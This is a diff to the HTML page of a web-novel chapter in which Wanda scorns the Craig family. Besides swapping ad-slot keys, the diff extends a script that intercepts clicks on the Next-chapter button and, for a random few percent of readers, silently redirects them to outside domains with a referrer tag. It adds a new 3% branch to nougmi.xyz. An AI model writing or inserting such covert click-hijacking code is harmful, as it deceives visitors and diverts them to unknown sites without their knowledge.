@@ -2397,22 +2397,22 @@
                 <p>“But if we don’t visit, won’t the Campbells think we’re being disrespectful?” Joslyn asked, more cautious now.</p>
                 <p>Wanda fixed her with a look so cold it could have iced over the sun. “Are you kidding me? I mean, take a look at yourselves—then take a good, long look at the Campbells. Do you really believe they care whether or not you show up? Going there won’t win you points—it’ll just make me look foolish by association.”</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
+                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
                 <p>Wanda’s tirade left the Craig family frozen in stunned silence.</p>
                 <p>Since infancy, Eva had whisked Wanda away to the Campbell household, and whenever Wanda returned to Ublento, she carried herself like royalty—her nose perpetually in the air, never once calling Norwood and Joslyn “Mom and Dad,” nor offering them the slightest hint of respect.</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
                 <p>Though bitterness simmered quietly within Norwood and Joslyn, they dared not voice their complaints. Instead, they wore strained smiles, pretending everything was fine.</p>
                 <p>Watching the Craig family shrink in shame brought Wanda deep satisfaction. At the Campbell estate, she maintained pleasantries and tact, forever walking on eggshells to keep favor. But here, among the Craigs, she ruled with ease. It was her domain to command, her bitterness to serve cold.</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
+                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
                 <p>Then, just as the air grew thick with tension, Wanda switched tactics. She softened her tone, slipping into something almost benevolent. “Don’t blame me for being harsh. Think of them as a warning. Behave yourselves—especially around Merlin. If you anger the Campbell family, no one will be able to save you.”</p>
                 <p>Bonnie rushed to nod, clinging to every syllable. “Yes, Wanda, you’re absolutely right.”</p>
                 <p>.</p>
                 <p>.</p>
                 <p>.</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
+                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
             </div>
             
             <div class="font-controls">
@@ -2534,7 +2534,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2550,8 +2550,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
